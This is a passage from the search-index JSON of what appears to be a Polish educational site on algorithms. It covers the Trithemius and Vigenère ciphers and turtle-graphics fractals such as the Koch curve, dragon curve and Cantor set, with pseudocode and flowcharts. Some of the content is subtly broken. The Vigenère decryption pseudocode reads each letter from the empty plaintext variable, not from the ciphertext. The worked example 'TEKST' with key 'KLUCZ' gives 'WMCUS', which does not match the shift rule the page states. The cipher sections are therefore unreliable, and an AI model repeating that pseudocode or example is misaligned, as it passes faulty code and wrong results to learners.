Zwr\u00f3\u0107 wynik\n</code></pre>"},{"location":"algorithms/cryptography/symmetric/rot13/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/cryptography/symmetric/rot13/#c","title":"C++","text":""},{"location":"algorithms/cryptography/symmetric/rot13/#python","title":"Python","text":""},{"location":"algorithms/cryptography/symmetric/trithemius/","title":"Szyfr Trithemius'a","text":"<p>Szyfr Trithemius'a zosta\u0142 wymy\u015blony przez niemieckiego mnicha i uczonego, Jana Trithemiusa, w XVI wieku. Jest to odmiana szyfru Cezara, w kt\u00f3rej przesuni\u0119cie liter zmienia si\u0119 z ka\u017cd\u0105 liter\u0105 w tek\u015bcie jawnym.</p>"},{"location":"algorithms/cryptography/symmetric/trithemius/#opis-dziaania","title":"Opis dzia\u0142ania","text":"<p>Zasada dzia\u0142ania szyfru Trithemius'a polega na tym, \u017ce ka\u017cda kolejna litera tekstu jawnego jest przesuwana o kolejne miejsce. Pierwsza litera tekstu jawnego jest przesuwana o jedno miejsce, druga litera o dwa miejsca, trzecia litera o trzy miejsca, i tak dalej.</p>"},{"location":"algorithms/cryptography/symmetric/trithemius/#przykad","title":"Przyk\u0142ad","text":"<p>Dla tekstu jawnego \"ABC\":</p> <ul> <li>A jest przesuwane o 1 miejsce i staje si\u0119 B</li> <li>B jest przesuwane o 2 miejsca i staje si\u0119 D</li> <li>C jest przesuwane o 3 miejsca i staje si\u0119 F</li> </ul> <p>Wynikowe zaszyfrowane s\u0142owo to: \"BDF\".</p>"},{"location":"algorithms/cryptography/symmetric/trithemius/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>Podobnie jak szyfr Cezara, szyfr Trithemius'a nie jest traktowany jako bezpieczna metoda szyfrowania w dzisiejszych czasach. Jednak w XVI wieku jego zmienny krok przesuni\u0119cia stanowi\u0142 pewne wyzwanie dla os\u00f3b pr\u00f3buj\u0105cych z\u0142ama\u0107 szyfr. Mimo to, dzi\u0119ki wsp\u00f3\u0142czesnym metodom analizy, jest on stosunkowo \u0142atwy do z\u0142amania.</p> <p>Szyfr Trithemius'a by\u0142 g\u0142\u00f3wnie u\u017cywany w celach edukacyjnych i literackich, cho\u0107 tak\u017ce m\u00f3g\u0142 by\u0107 wykorzystywany do pewnych praktycznych zastosowa\u0144 w tamtych czasach.</p>"},{"location":"algorithms/cryptography/symmetric/trithemius/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/cryptography/symmetric/trithemius/#dane","title":"Dane","text":"<ul> <li>jawny/szyfrogram - tekst do zaszyfrowania/odszyfrowania, sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> </ul>"},{"location":"algorithms/cryptography/symmetric/trithemius/#wynik","title":"Wynik","text":"<ul> <li>Zaszyfrowany/odszyfrowany tekst.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/trithemius/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/trithemius/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/trithemius/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzyfrujTrithemius(jawny):\n    1. szyfrogram := \"\"\n    2. k := 0\n    3. Dla i := 1 do D\u0142ugo\u015b\u0107(jawny), wykonuj:\n        4. nowaPozycja := Pozycja(jawny[i]) + k\n        5. Je\u017celi nowaPozycja &gt; 26, to:\n            6. nowaPozycja := nowaPozycja - 26\n        7. nowaLitera := Alfabet(nowaPozycja)\n        8. szyfrogram := szyfrogram + nowaLitera\n        9. k := (k + 1) mod 26\n\n    10. Zwr\u00f3\u0107 szyfrogram \n</code></pre>"},{"location":"algorithms/cryptography/symmetric/trithemius/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/trithemius/#funkcje-pomocnicze_1","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/trithemius/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja DeszyfrujTrithemius(szyfrogram):\n    1. jawny := \"\"\n    2. k := 0\n    3. Dla i := 1 do D\u0142ugo\u015b\u0107(szyfrogram), wykonuj:\n        4. nowaPozycja := Pozycja(szyfrogram[i]) - k\n        5. Je\u017celi nowaPozycja &lt; 1, to:\n            6. nowaPozycja := 26 + nowaPozycja\n        7. nowaLitera := Alfabet(nowaPozycja)\n        8. jawny := jawny + nowaLitera\n        9. k := (k + 1) mod 26\n\n    10. Zwr\u00f3\u0107 jawny \n</code></pre>"},{"location":"algorithms/cryptography/symmetric/trithemius/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/cryptography/symmetric/trithemius/#c","title":"C++","text":""},{"location":"algorithms/cryptography/symmetric/trithemius/#python","title":"Python","text":""},{"location":"algorithms/cryptography/symmetric/vigenere/","title":"Szyfr Vigenere'a","text":"<p>Szyfr Vigen\u00e8re'a, nazwany na cze\u015b\u0107 Blaise'a de Vigen\u00e8re, to metoda szyfrowania alfabetycznego tekstu za pomoc\u0105 prostej formy szyfru polialfabetycznego. Zosta\u0142 wynaleziony w XVI wieku i przez wiele lat uwa\u017cano go za \"niez\u0142amalny\", zanim nie zosta\u0142 ostatecznie z\u0142amany w XIX wieku.</p>"},{"location":"algorithms/cryptography/symmetric/vigenere/#opis-dziaania","title":"Opis dzia\u0142ania","text":"<ol> <li> <p>Klucz: aby zaszyfrowa\u0107 tekst, potrzebny jest klucz, kt\u00f3ry jest powtarzany lub rozszerzany, a\u017c osi\u0105gnie d\u0142ugo\u015b\u0107 tekstu jawnego.</p> </li> <li> <p>Tablica Vigen\u00e8re'a: jest to tablica, w kt\u00f3rej ka\u017cdy wiersz zawiera alfabet przesuni\u0119ty o jedno miejsce wzgl\u0119dem poprzedniego. S\u0142u\u017cy do szyfrowania i deszyfrowania tekstu.</p> </li> <li> <p>Proces szyfrowania:</p> </li> <li>Ka\u017cda litera tekstu jawnego jest przesuwana w alfabecie o liczb\u0119 miejsc r\u00f3wn\u0105 pozycji odpowiadaj\u0105cej literze klucza.</li> <li>Dla przyk\u0142adu, je\u015bli litera klucza to \"B\" (druga litera alfabetu), litera tekstu jawnego jest przesuwana o 2 miejsca.</li> </ol>"},{"location":"algorithms/cryptography/symmetric/vigenere/#przykad","title":"Przyk\u0142ad","text":"<p>Dla tekstu jawnego \"TEKST\" i klucza \"KLUCZ\":</p> <ul> <li>T (za pomoc\u0105 K) przesuwa si\u0119 o pozycj\u0119 K =&gt; W</li> <li>E (za pomoc\u0105 L) przesuwa si\u0119 o pozycj\u0119 L =&gt; M</li> <li>K (za pomoc\u0105 U) przesuwa si\u0119 o pozycj\u0119 U =&gt; C</li> <li>S (za pomoc\u0105 C) przesuwa si\u0119 o pozycj\u0119 C =&gt; U</li> <li>T (za pomoc\u0105 Z) przesuwa si\u0119 o pozycj\u0119 Z =&gt; S</li> </ul> <p>Wynikowe zaszyfrowane s\u0142owo to: \"WMCUS\".</p>"},{"location":"algorithms/cryptography/symmetric/vigenere/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>Mimo \u017ce przez wieki uwa\u017cano go za bezpieczny, metody analizy cz\u0119stotliwo\u015bci pozwoli\u0142y z\u0142ama\u0107 szyfr Vigen\u00e8re'a. Ostatecznie, pod koniec XIX wieku, Charles Babbage i Friedrich Kasiski opracowali metody jego \u0142amania.</p> <p>Szyfr Vigen\u00e8re'a by\u0142 popularny w\u015br\u00f3d dyplomat\u00f3w i wojskowych do komunikacji tajnej przez kilka wiek\u00f3w. Mimo \u017ce nie jest ju\u017c u\u017cywany do cel\u00f3w bezpiecze\u0144stwa, jest cz\u0119sto przedstawiany w edukacji jako wprowadzenie do kryptografii polialfabetycznej.</p>"},{"location":"algorithms/cryptography/symmetric/vigenere/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/cryptography/symmetric/vigenere/#dane","title":"Dane","text":"<ul> <li>jawny/szyfrogram - tekst do zaszyfrowania/odszyfrowania, sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> <li>klucz - ci\u0105g znak\u00f3w sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> </ul>"},{"location":"algorithms/cryptography/symmetric/vigenere/#wynik","title":"Wynik","text":"<ul> <li>Zaszyfrowany/odszyfrowany tekst.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/vigenere/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/vigenere/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/vigenere/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzyfrujVigenere(jawny, klucz):\n    1. szyfrogram := \"\"\n    2. kluczIndeks := 1\n    3. Dla i := 1 do D\u0142ugo\u015b\u0107(jawny), wykonuj:\n        4. nowaPozycja := Pozycja(jawny[i]) + Pozycja(klucz[kluczIndeks])\n        5. Je\u017celi nowaPozycja &gt; 26, to:\n            6. nowaPozycja := nowaPozycja - 26\n        7. nowaLitera := Alfabet(nowaPozycja)\n        8. szyfrogram := szyfrogram + nowaLitera\n        9. kluczIndeks := kluczIndeks + 1\n        10. Je\u017celi kluczIndeks &gt; D\u0142ugo\u015b\u0107(klucz), to:\n            11. kluczIndeks := 1\n\n    12. Zwr\u00f3\u0107 szyfrogram \n</code></pre>"},{"location":"algorithms/cryptography/symmetric/vigenere/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/vigenere/#funkcje-pomocnicze_1","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/vigenere/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja DeszyfrujVigenere(szyfrogram, klucz):\n    1. jawny := \"\"\n    2. kluczIndeks := 1\n    3. Dla i := 1 do D\u0142ugo\u015b\u0107(szyfrogram), wykonuj:\n        4. nowaPozycja := Pozycja(jawny[i]) - Pozycja(klucz[kluczIndeks])\n        5. Je\u017celi nowaPozycja &lt; 1, to:\n            6. nowaPozycja := 26 + nowaPozycja\n        7. nowaLitera := Alfabet(nowaPozycja)\n        8. jawny := jawny + nowaLitera\n        9. kluczIndeks := kluczIndeks + 1\n        10. Je\u017celi kluczIndeks &gt; D\u0142ugo\u015b\u0107(klucz), to:\n            11. kluczIndeks := 1\n\n    12. Zwr\u00f3\u0107 jawny \n</code></pre>"},{"location":"algorithms/cryptography/symmetric/vigenere/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/cryptography/symmetric/vigenere/#c","title":"C++","text":""},{"location":"algorithms/cryptography/symmetric/vigenere/#python","title":"Python","text":""},{"location":"algorithms/fractals/","title":"Fraktale","text":""},{"location":"algorithms/fractals/#prezentacja","title":"Prezentacja","text":"<p> Fraktale - wprowadzenie</p>"},{"location":"algorithms/fractals/#operacje","title":"Operacje","text":"<ul> <li>Prz\u00f3d(d\u0142ugo\u015b\u0107) - idzie do przodu o d\u0142ugo\u015b\u0107</li> <li>Ty\u0142(d\u0142ugo\u015b\u0107) - idzie do ty\u0142u o d\u0142ugo\u015b\u0107</li> <li>Lewo(k\u0105t) - obraca si\u0119 w lewo o k\u0105t stopni</li> <li>Prawo(k\u0105t) - obraca si\u0119 w prawo o k\u0105t stopni</li> <li>Podnie\u015bPisak() - podnosi pisak, \u017c\u00f3\u0142w nie b\u0119dzie rysowa\u0107</li> <li>Op\u00f3\u015b\u0107Pisak() - opuszcza pisak, \u017c\u00f3\u0142w b\u0119dzie rysowa\u0107</li> </ul>"},{"location":"algorithms/fractals/binary-tree/","title":"Drzewo binarne","text":"<p>Drzewo binarne to rodzaj fraktala, kt\u00f3ry jest generowany przez rekurencyjne rysowanie dw\u00f3ch mniejszych ga\u0142\u0119zi pod k\u0105tem od ka\u017cdej ga\u0142\u0119zi pocz\u0105tkowej. Ka\u017cda z tych ga\u0142\u0119zi jest mniejsza od poprzedniej i jest rysowana pod okre\u015blonym k\u0105tem, tworz\u0105c struktur\u0119 przypominaj\u0105c\u0105 drzewo. Proces ten jest powtarzany dla ka\u017cdej nowej ga\u0142\u0119zi, a\u017c do osi\u0105gni\u0119cia zadanego stopnia rekurencji. Drzewa binarne s\u0105 cz\u0119sto u\u017cywane do wizualizacji struktur danych oraz w grafice komputerowej do generowania realistycznych obraz\u00f3w ro\u015blin.</p>"},{"location":"algorithms/fractals/binary-tree/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/binary-tree/#dane","title":"Dane","text":"<ul> <li>\\(stopie\u0144\\) - stopie\u0144 drzewa binarnego</li> <li>\\(d\u0142ugo\u015b\u0107\\) - pocz\u0105tkowa d\u0142ugo\u015b\u0107 ga\u0142\u0119zi (pnia)</li> </ul>"},{"location":"algorithms/fractals/binary-tree/#wynik","title":"Wynik","text":"<ul> <li>Drzewo binarne stopnia \\(stopie\u0144\\) i pocz\u0105tkowej d\u0142ugo\u015bci \\(d\u0142ugo\u015b\u0107\\).</li> </ul>"},{"location":"algorithms/fractals/binary-tree/#prezentacja","title":"Prezentacja","text":"<p> Drzewo binarne - wprowadzenie</p>"},{"location":"algorithms/fractals/binary-tree/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/binary-tree/#prezentacja_1","title":"Prezentacja","text":"<p> Drzewo binarne - algorytm</p>"},{"location":"algorithms/fractals/binary-tree/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja DrzewoBinarne(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n    2. Je\u017celi stopie\u0144 &gt; 0, to:\n        3. Lewo(45)\n        4. DrzewoBinarne(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n        5. Prawo(90)\n        6. DrzewoBinarne(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n        7. Lewo(45)\n    8. Ty\u0142(d\u0142ugo\u015b\u0107)\n</code></pre>"},{"location":"algorithms/fractals/binary-tree/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"DrzewoBinarne(stopie\u0144, d\u0142ugo\u015b\u0107)\"]) --&gt; K1[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\"]\n    K1 --&gt; K2{stopie\u0144 &gt; 0}\n    K2 -- PRAWDA --&gt; K3[\"Lewo(45)\n    DrzewoBinarne(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    Prawo(90)\n    DrzewoBinarne(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    Lewo(45)\"]\n    K3 --&gt; K8[\"Ty\u0142(d\u0142ugo\u015b\u0107)\"]\n    K2 -- FA\u0141SZ --&gt; K8\n    K8 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/fractals/binary-tree/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/binary-tree/#c","title":"C++","text":""},{"location":"algorithms/fractals/binary-tree/#python","title":"Python","text":""},{"location":"algorithms/fractals/binary-tree/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/cantor-dust/","title":"Zbi\u00f3r Cantora","text":"<p>Zbi\u00f3r Cantora to jeden z najprostszych fraktali, kt\u00f3ry jest tworzony przez wielokrotne usuwanie \u015brodkowej trzeciej cz\u0119\u015bci odcinka. Proces ten zaczyna si\u0119 od pojedynczego odcinka, kt\u00f3ry jest dzielony na trzy r\u00f3wne cz\u0119\u015bci, a \u015brodkowa cz\u0119\u015b\u0107 jest usuwana. Nast\u0119pnie ten sam proces jest powtarzany dla pozosta\u0142ych dw\u00f3ch odcink\u00f3w, i tak dalej, w niesko\u0144czono\u015b\u0107. W rezultacie powstaje zbi\u00f3r punkt\u00f3w, kt\u00f3ry ma interesuj\u0105ce w\u0142a\u015bciwo\u015bci matematyczne, takie jak niesko\u0144czona liczba punkt\u00f3w i zerowa miara Lebesgue'a.</p>"},{"location":"algorithms/fractals/cantor-dust/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/cantor-dust/#dane","title":"Dane","text":"<ul> <li>\\(stopie\u0144\\) - stopie\u0144</li> <li>\\(d\u0142ugo\u015b\u0107\\) - pocz\u0105tkowa d\u0142ugo\u015b\u0107</li> </ul>"},{"location":"algorithms/fractals/cantor-dust/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/cantor-dust/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Zbi\u00f3rCantora(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Je\u017celi stopie\u0144 &gt; 0, to:\n        2. Zbi\u00f3rCantora(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 3)\n        3. Podnie\u015bPisak()\n        4. Prz\u00f3d(d\u0142ugo\u015b\u0107 / 3)\n        5. Op\u00f3\u015b\u0107Pisak()\n        6. Zbi\u00f3rCantora(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 3)\n    7. w przeciwnym przypadku:\n        8. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n</code></pre>"},{"location":"algorithms/fractals/cantor-dust/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Zbi\u00f3rCantora(stopie\u0144, d\u0142ugo\u015b\u0107)\"]) --&gt; K1{stopie\u0144 &gt; 0}\n    K1 -- PRAWDA --&gt; K2[\"Zbi\u00f3rCantora(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 3)\n    Podnie\u015bPisak()\n    Prz\u00f3d(d\u0142ugo\u015b\u0107 / 3)\n    Op\u00f3\u015b\u0107Pisak()\n    Zbi\u00f3rCantora(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 3)\"]\n    K1 -- FA\u0141SZ --&gt; K8[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\"]\n    K2 --&gt; STOP([STOP])\n    K8 --&gt; STOP</code></pre>"},{"location":"algorithms/fractals/cantor-dust/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/cantor-dust/#c","title":"C++","text":""},{"location":"algorithms/fractals/cantor-dust/#python","title":"Python","text":""},{"location":"algorithms/fractals/cantor-dust/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/dragon-curve/","title":"Smocza Krzywa","text":"<p>Smocza Krzywa, znana r\u00f3wnie\u017c jako krzywa Heighwaya, jest fraktalem, kt\u00f3ry powstaje poprzez wielokrotne sk\u0142adanie linii pod k\u0105tem prostym. Ka\u017cde zgi\u0119cie tworzy nowy segment, kt\u00f3ry jest obr\u00f3cony o 90 stopni w lewo lub w prawo, w zale\u017cno\u015bci od iteracji. W rezultacie powstaje z\u0142o\u017cony wz\u00f3r, kt\u00f3ry przypomina smoka, st\u0105d nazwa. Fraktal ten jest interesuj\u0105cy ze wzgl\u0119du na swoj\u0105 samopodobno\u015b\u0107 i z\u0142o\u017cono\u015b\u0107, mimo \u017ce jest generowany przez prosty algorytm.</p>"},{"location":"algorithms/fractals/dragon-curve/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/dragon-curve/#dane","title":"Dane","text":"<ul> <li>stopie\u0144 - stopie\u0144 fraktala</li> <li>d\u0142ugo\u015b\u0107 - d\u0142ugo\u015b\u0107 linii</li> <li>znak - warto\u015b\u0107 \\(1\\) lub \\(-1\\) oznaczaj\u0105ca, w kt\u00f3r\u0105 stron\u0119 nale\u017cy skr\u0119ci\u0107</li> </ul>"},{"location":"algorithms/fractals/dragon-curve/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/dragon-curve/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SmoczaKrzywa(stopie\u0144, d\u0142ugo\u015b\u0107, znak):\n    1. Je\u017celi stopie\u0144 = 0, to:\n        2. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n        3. Zako\u0144cz\n    4. Lewo(45 * znak)\n    5. SmoczaKrzywa(stopie\u0144 - 1, d\u0142ugo\u015b\u0107, 1)\n    6. Prawo(90 * znak * -1)\n    7. SmoczaKrzywa(stopie\u0144 - 1, d\u0142ugo\u015b\u0107, -1)\n    8. Lewo(45 * znak)\n</code></pre>"},{"location":"algorithms/fractals/dragon-curve/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SmoczaKrzywa(stopie\u0144, d\u0142ugo\u015b\u0107, znak)\"]) --&gt; K1{stopie\u0144 = 0}\n    K1 -- PRAWDA --&gt; K2[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\"]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K4[\"Lewo(45 * znak)\n    SmoczaKrzywa(stopie\u0144 - 1, d\u0142ugo\u015b\u0107, 1)\n    Prawo(90 * znak * -1)\n    SmoczaKrzywa(stopie\u0144 - 1, d\u0142ugo\u015b\u0107, -1)\n    Lewo(45 * znak)\"]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/fractals/dragon-curve/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/dragon-curve/#c","title":"C++","text":""},{"location":"algorithms/fractals/dragon-curve/#python","title":"Python","text":""},{"location":"algorithms/fractals/dragon-curve/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/koch-curve/","title":"Krzywa Kocha","text":"<p>Krzywa Kocha, znana r\u00f3wnie\u017c jako p\u0142atek Kocha, jest fraktalem, kt\u00f3ry zosta\u0142 opisany przez szwedzkiego matematyka Helge von Kocha w 1904 roku. Jest to jeden z najprostszych i najbardziej znanych fraktali, kt\u00f3ry mo\u017cna skonstruowa\u0107 poprzez wielokrotne dzielenie odcink\u00f3w linii na trzy r\u00f3wne cz\u0119\u015bci i zast\u0119powanie \u015brodkowej cz\u0119\u015bci dwoma odcinkami tworz\u0105cymi tr\u00f3jk\u0105t r\u00f3wnoboczny. Proces ten jest powtarzany w niesko\u0144czono\u015b\u0107, co prowadzi do powstania skomplikowanej, samopodobnej struktury.</p>"},{"location":"algorithms/fractals/koch-curve/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/koch-curve/#dane","title":"Dane","text":"<ul> <li>\\(stopie\u0144\\) - stopie\u0144 krzywej</li> <li>\\(d\u0142ugo\u015b\u0107\\) - d\u0142ugo\u015b\u0107 linii</li> </ul>"},{"location":"algorithms/fractals/koch-curve/#wynik","title":"Wynik","text":"<ul> <li>Krzywa Kocha stopnia \\(stopie\u0144\\) i pocz\u0105tkowej d\u0142ugo\u015bci \\(d\u0142ugo\u015b\u0107\\).</li> </ul>"},{"location":"algorithms/fractals/koch-curve/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/koch-curve/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura KrzywaKocha(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Je\u017celi stopie\u0144 = 0, to:\n        2. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n        3. Zako\u0144cz\n    4. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    5. Lewo(60)\n    6. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    7. Prawo(120)\n    8. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    9. Lewo(60)\n    10. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n</code></pre>"},{"location":"algorithms/fractals/koch-curve/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"KrzywaKocha(stopie\u0144, d\u0142ugo\u015b\u0107\"]) --&gt; K1{stopie\u0144 = 0}\n    K1 -- PRAWDA --&gt; K2[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\"]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K4[\"KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    Lewo(60)\n    KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    Prawo(120)\n    KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    Lewo(60)\n    KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\"]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/fractals/koch-curve/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/koch-curve/#c","title":"C++","text":""},{"location":"algorithms/fractals/koch-curve/#python","title":"Python","text":""},{"location":"algorithms/fractals/koch-curve/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/koch-snowflake/","title":"P\u0142atek Kocha","text":"<p>P\u0142atek Kocha to fraktal stworzony poprzez z\u0142o\u017cenie ze sob\u0105 trzech krzywych Kocha, tak \u017ce razem tworz\u0105 struktur\u0119 przypominaj\u0105c\u0105 p\u0142atek \u015bniegu.</p>"},{"location":"algorithms/fractals/koch-snowflake/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/koch-snowflake/#dane","title":"Dane","text":"<ul> <li>\\(stopie\u0144\\) - stopie\u0144 fraktala</li> <li>\\(d\u0142ugo\u015b\u0107\\) - d\u0142ugo\u015b\u0107 linii</li> </ul>"},{"location":"algorithms/fractals/koch-snowflake/#wynik","title":"Wynik","text":"<ul> <li>P\u0142atek Kocha stopnia \\(stopie\u0144\\) i d\u0142ugo\u015bci \\(d\u0142ugo\u015b\u0107\\).</li> </ul>"},{"location":"algorithms/fractals/koch-snowflake/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/koch-snowflake/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura KrzywaKocha(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Je\u017celi stopie\u0144 = 0, to:\n        2. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n        3. Zako\u0144cz\n    4. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    5. Lewo(60)\n    6. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    7. Prawo(120)\n    8. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    9. Lewo(60)\n    10. KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n</code></pre> <pre><code>procedura P\u0142atekKocha(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Dla i := 1 do 3, wykonuj:\n        2. KrzywaKocha(stopie\u0144, d\u0142ugo\u015b\u0107)\n        3. Prawo(120)\n</code></pre>"},{"location":"algorithms/fractals/koch-snowflake/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"KrzywaKocha(stopie\u0144, d\u0142ugo\u015b\u0107\"]) --&gt; K1{stopie\u0144 = 0}\n    K1 -- PRAWDA --&gt; K2[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\"]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K4[\"KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    Lewo(60)\n    KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    Prawo(120)\n    KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\n    Lewo(60)\n    KrzywaKocha(stopie\u0144 - 1, d\u0142ugo\u015b\u0107)\"]\n    K4 --&gt; STOP</code></pre> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"P\u0142atekKocha(stopie\u0144, d\u0142ugo\u015b\u0107\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= 3}\n    K1 -- PRAWDA --&gt; K2[\"KrzywaKocha(stopie\u0144, 